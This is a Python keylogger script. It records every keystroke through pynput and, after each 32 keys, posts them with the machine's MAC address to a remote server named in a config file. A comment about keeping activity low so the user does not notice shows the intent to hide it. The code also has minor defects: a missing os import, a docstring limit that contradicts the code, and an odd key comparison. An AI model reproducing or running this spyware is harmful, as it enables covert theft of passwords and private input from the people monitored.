from typing import List, Final, Dict, Optional, Union
import json
import requests
import uuid
from pynput import keyboard  # type: ignore
from pynput.keyboard import Key, KeyCode  # type: ignore

# Maximum number of keys to save, keep low to avoid memory issues
# that could warrant concern from user
SAVED_KEYS_LIMIT: Final[int] = 32


class Keylogger:
    """
    Logs keyboard events by their names at a lot limit of 1024 then sends logged keys
    to server as JSON.

    Example
    -------

    {"keys_pressed": ["shift", "space", ...] }
    """

    _keys_pressed: List[str] = []
    _pressed: dict = {}

    def __init__(self):
        with open(f'.{os.sep}server_address.json') as fp:
            self._server_addr: str = json.load(fp)['server']

    def log_key(self, key: Union[Key, KeyCode]):
        """
        Logs keyboard event

        Paramters
        ---------

        event: Union[Key, KeyCode]
             Event to log
        """
        character: str = None
        try:
            if self._pressed != key.char:
                character = key.char
        except AttributeError:
            character = key.name

        if character in self._pressed.keys():
            if self._pressed[character]:
                return

        self._keys_pressed.append(character)

        self._pressed[character] = True

        if len(self._keys_pressed) >= SAVED_KEYS_LIMIT:
            url: Final[str] = f'{self._server_addr}/keylogger/send_data'
            response: dict = requests.post(url, json=self._to_json())
            self._keys_pressed.clear()

    def release_key(self, key: Union[Key, KeyCode]):
        """
        Logs keyboard release event
        Paramters
        ---------

        event: Union[Key, KeyCode]
             Event to log
        """
        character: str = None
        try:
            if self._pressed != key.char:
                character = key.char
        except AttributeError:
            character = key.name
        self._pressed[character] = False

    def _to_json(self) -> str:
        """
        Converts the current object to JSON

        Returns
        -------

        str
             Object represented as JSON
             { "keys_pressed": ["shift", "space", ...] }
        """
        keys_json: Dict[str, List[str]] = {
            "keys_pressed": self._keys_pressed,
            "mac": hex(uuid.getnode())
        }
        return json.dumps(keys_json)


def start_logger():
    """
    Main entry point to start Keylogger
    """
    keylogger = Keylogger()
    with keyboard.Listener(on_press=keylogger.log_key,
                           on_release=keylogger.release_key) as listener:
        listener.join()


if __name__ == "__main__":
    start_logger()
